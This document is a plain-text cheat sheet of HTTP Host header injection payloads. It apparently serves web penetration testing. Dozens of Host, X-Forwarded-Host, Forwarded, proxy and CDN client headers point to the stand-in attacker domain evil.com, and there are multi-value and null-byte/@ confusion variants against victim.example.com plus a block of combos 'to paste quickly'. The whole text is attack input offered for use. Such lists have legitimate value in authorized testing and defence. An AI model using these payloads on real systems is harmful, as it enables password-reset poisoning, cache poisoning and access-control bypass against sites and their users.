# --- Host header canonical forms
Host: evil.com
Host: evil.com:80
Host: evil.com:443
Host: www.evil.com
Host: evil.com.;   # trailing dot
Host: evil.com:8080

# --- Standard forwarded / host-related headers
X-Forwarded-Host: evil.com
X-Forwarded-Host: www.evil.com
X-Forwarded-Host: evil.com:80
X-Forwarded-Host: evil.com:443

X-Forwarded-For: evil.com
X-Forwarded: evil.com
Forwarded: host=evil.com
Forwarded: host=evil.com;proto=http
Forwarded: for=127.0.0.1;host=evil.com

X-Real-IP: evil.com
X-Host: evil.com
X-Original-Host: evil.com
X-Forwarded-Server: evil.com
X-Forwarded-Server: www.evil.com

# --- Proxy / reverse proxy related headers
X-Original-Forwarded-For: evil.com
X-ProxyHost: evil.com
X-Proxy-Host: evil.com
X-ProxyUser-IP: evil.com
X-Remote-Host: evil.com
X-Remote-Addr: evil.com

# --- CDN / provider-specific headers
CF-Connecting-Host: evil.com
CF-Connecting-IP: evil.com
True-Client-Host: evil.com
True-Client-IP: evil.com
Fastly-Client-Host: evil.com
Fastly-Client-IP: evil.com

# --- Application / cluster headers
X-Cluster-Client-Host: evil.com
X-Cluster-Client-IP: evil.com
X-ClientHost: evil.com
X-Client-IP: evil.com
Client-IP: evil.com
X-ClientAddress: evil.com
Proxy-Client-Host: evil.com
Proxy-Client-IP: evil.com
WL-Proxy-Client-Host: evil.com
WL-Proxy-Client-IP: evil.com

# --- Host-related miscellaneous headers
Host-Header: evil.com
Original-Host: evil.com
Requested-Host: evil.com
Forwarded-Host: evil.com
X-Original-Host: evil.com
X-Host-Override: evil.com
X-Rewrite-Host: evil.com

# --- Variants with multiple values (order matters in some parsers)
X-Forwarded-Host: evil.com, victim.example.com
X-Forwarded-Host: victim.example.com, evil.com
X-Forwarded-Host: evil.com, 127.0.0.1
Host: victim.example.com
X-Forwarded-Host: evil.com:80, victim.example.com

# --- RFC Forwarded structured examples
Forwarded: for=203.0.113.5; proto=http; by=203.0.113.2; host=evil.com
Forwarded: host=evil.com
Forwarded: for=127.0.0.1;host="evil.com:8080"

# --- Common header combos to paste quickly (use together)
Host: evil.com
X-Forwarded-Host: evil.com
X-Forwarded-For: evil.com
Forwarded: host=evil.com
X-Real-IP: evil.com

# --- Host variants using subdomain / path confusion
Host: evil.com/login
Host: evil.com@victim.example.com
Host: evil.com%00.victim.example.com
